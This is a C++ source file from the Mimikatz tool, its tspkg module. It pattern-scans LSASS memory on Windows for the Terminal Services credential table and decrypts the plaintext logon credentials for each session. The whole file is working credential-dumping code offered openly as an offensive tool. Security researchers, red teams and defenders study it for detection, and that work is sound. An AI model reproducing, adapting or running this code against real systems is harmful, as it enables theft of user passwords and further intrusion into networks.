/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by-nc-sa/3.0/
	This file  : http://creativecommons.org/licenses/by/3.0/
*/
#include "tspkg.h"

PRTL_AVL_TABLE TSGlobalCredTable = NULL;

bool searchTSPKGFuncs()
{
#ifdef _M_X64
	BYTE PTRN_WALL_TSGlobalCredTable[]	= {0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x0d};
	LONG OFFS_WALL_TSGlobalCredTable	= sizeof(PTRN_WALL_TSGlobalCredTable);
#elif defined _M_IX86
	BYTE PTRN_WNO8_TSGlobalCredTable[]	= {0x8b, 0xff, 0x55, 0x8b, 0xec, 0x51, 0x56, 0xbe};
	LONG OFFS_WNO8_TSGlobalCredTable	= sizeof(PTRN_WNO8_TSGlobalCredTable);

	BYTE PTRN_WIN8_TSGlobalCredTable[]	= {0x8b, 0xff, 0x53, 0xbb};
	LONG OFFS_WIN8_TSGlobalCredTable	= sizeof(PTRN_WIN8_TSGlobalCredTable);
#endif

	if(!TSGlobalCredTable)
	{
		PBYTE *pointeur = NULL; PBYTE pattern = NULL; ULONG taille = 0; LONG offset = 0;

		pointeur= reinterpret_cast<PBYTE *>(&TSGlobalCredTable);
#ifdef _M_X64
		pattern	= PTRN_WALL_TSGlobalCredTable;
		taille	= sizeof(PTRN_WALL_TSGlobalCredTable);
		offset	= OFFS_WALL_TSGlobalCredTable;
#elif defined _M_IX86
		if(mod_system::GLOB_Version.dwBuildNumber < 8000)
		{
			pattern	= PTRN_WNO8_TSGlobalCredTable;
			taille	= sizeof(PTRN_WNO8_TSGlobalCredTable);
			offset	= OFFS_WNO8_TSGlobalCredTable;
		}
		else
		{
			pattern	= PTRN_WIN8_TSGlobalCredTable;
			taille	= sizeof(PTRN_WIN8_TSGlobalCredTable);
			offset	= OFFS_WIN8_TSGlobalCredTable;
		}
#endif

		mod_memory::genericPatternSearch(pointeur, L"tspkg", pattern, taille, offset);
	}
	return (searchLSAFuncs() && TSGlobalCredTable);
}

__kextdll bool __cdecl getTsPkgFunctions(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	wostringstream monStream;
	monStream << L"** tspkg.dll/lsasrv.dll ** ; Research Status : " << (searchTSPKGFuncs() ? L"OK :)" : L"KO :(") << endl << endl <<
		L"@TSGlobalCredTable  = " << TSGlobalCredTable << endl <<
		L"@LsaUnprotectMemory = " << SeckPkgFunctionTable->LsaUnprotectMemory << endl;
	return sendTo(monPipe, monStream.str());
}

__kextdll bool __cdecl getTsPkg(mod_pipe * monPipe, vector<wstring> * mesArguments)
{
	vector<pair<PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<PFN_ENUM_BY_LUID, wstring>(getTsPkgLogonData, wstring(L"tspkg")));
	return getLogonData(monPipe, mesArguments, &monProvider);
}

bool WINAPI getTsPkgLogonData(__in PLUID logId, __in mod_pipe * monPipe, __in bool justSecurity)
{
	wostringstream maReponse;
	if(searchTSPKGFuncs())
	{
		PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
		KIWI_TS_CREDENTIAL maRecherche;
		RtlZeroMemory(&maRecherche, sizeof(KIWI_TS_CREDENTIAL));
		maRecherche.LocallyUniqueIdentifier = *logId;
		PKIWI_TS_CREDENTIAL ptrMaRecherche = &maRecherche;
		if(PKIWI_TS_CREDENTIAL * pLogSession = reinterpret_cast<PKIWI_TS_CREDENTIAL *>(RtlLookupElementGenericTableAvl(TSGlobalCredTable, &ptrMaRecherche)))
		{
			if((*pLogSession)->pTsPrimary)
			{
				mesCreds = &(*pLogSession)->pTsPrimary->credentials;
			} 
			else maReponse << L"n.s. (SuppCred KO) / ";
		}
		genericCredsToStream(&maReponse, mesCreds, justSecurity, true);
	}
	else maReponse << L"n.a. (tspkg KO)";

	return sendTo(monPipe, maReponse.str());
}